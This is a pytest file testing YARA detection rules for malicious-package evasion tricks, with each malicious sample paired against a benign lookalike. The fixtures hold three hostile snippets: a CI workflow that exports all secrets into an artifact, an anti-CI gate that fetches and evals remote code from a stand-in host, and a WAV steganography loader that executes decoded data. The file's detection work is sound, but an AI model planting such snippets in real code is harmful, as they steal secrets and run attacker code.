# SPDX-License-Identifier: AGPL-3.0-or-later
"""Behavioral evasion YARA rules (2025-26 TTPs): must match the malicious combination
and NOT the benign lookalike (!CI / wave / ${{secrets}} are all common in legit code)."""
from __future__ import annotations

import pathlib

import pytest

yara = pytest.importorskip("yara")
# behavioral_evasion.yar was split into one-rule-per-file (evasion_*.yar); compile
# just those three so unrelated baseline rules can't perturb the clean-case asserts.
_YARA_DIR = pathlib.Path(__file__).resolve().parents[1] / "pkgward/intel/baseline/yara"
RULE_FILES = sorted(_YARA_DIR.glob("evasion_*.yar"))


@pytest.fixture(scope="module")
def rules():
    assert RULE_FILES, "no evasion_*.yar rule files found"
    return yara.compile(filepaths={p.stem: str(p) for p in RULE_FILES})


def _hits(rules, src):
    return {m.rule for m in rules.match(data=src.encode())}


def test_workflow_secrets_exfil_matches(rules):
    mal = ("on: [push]\njobs:\n x:\n  steps:\n   - env:\n      V: ${{ toJSON(secrets) }}\n"
           "     run: echo \"$V\" > out.txt\n   - uses: actions/upload-artifact@v4")
    assert "evasion_workflow_secrets_exfil" in _hits(rules, mal)


def test_workflow_individual_secret_is_clean(rules):
    benign = "on: [push]\njobs:\n x:\n  steps:\n   - env:\n      T: ${{ secrets.NPM_TOKEN }}\n     run: npm publish"
    assert _hits(rules, benign) == set()


def test_anti_ci_gate_matches(rules):
    mal = 'if(!process.env.CI){const cp=require("child_process");fetch("http://e/x").then(r=>eval(r))}'
    assert "evasion_anti_ci_payload_gate" in _hits(rules, mal)


def test_benign_ci_skip_is_clean(rules):
    benign = 'if(process.env.CI){console.log("skip")}else{progress()}'
    assert _hits(rules, benign) == set()


def test_stego_loader_matches(rules):
    mal = ("import wave,base64,subprocess,sys\nw=wave.open('r.wav');d=w.readframes(9)\n"
           "p=base64.b64decode(d);subprocess.Popen([sys.executable,'-c',p])")
    assert "evasion_media_stego_loader" in _hits(rules, mal)


def test_benign_audio_is_clean(rules):
    benign = "import wave\nw=wave.open('s.wav');f=w.readframes(w.getnframes());play(f)"
    assert _hits(rules, benign) == set()
